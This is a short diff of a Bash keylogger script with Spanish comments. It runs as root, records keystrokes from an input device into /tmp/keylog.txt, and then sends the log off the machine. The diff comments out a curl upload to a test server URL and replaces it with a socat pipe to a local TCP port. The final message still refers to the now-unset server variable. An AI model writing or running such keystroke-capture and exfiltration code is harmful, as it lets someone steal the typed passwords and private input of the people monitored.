@@ -2,7 +2,7 @@
 
 LOG_FILE="/tmp/keylog.txt"
 DEVICE="/dev/input/event3"  # Reemplázalo con el ID correcto
-SERVER_URL="http://server-prueba.com/upload"
+# SERVER_URL="http://server-prueba.com/upload"
 
 # Verifica que el script se ejecute como root
 if [[ $EUID -ne 0 ]]; then
@@ -23,7 +23,10 @@ kill $PID
 echo "[*] Captura finalizada. Enviando archivo al servidor..."
 
 # Enviar el archivo al servidor remoto
-curl -X POST -F "file=@$LOG_FILE" "$SERVER_URL"
+# curl -X POST -F "file=@$LOG_FILE" "$SERVER_URL"
+
+# Enviar el archivo al socat
+cat /tmp/keylog.txt | socat - TCP:127.0.0.1:1234
 
 echo "[*] Archivo enviado correctamente a $SERVER_URL"
 
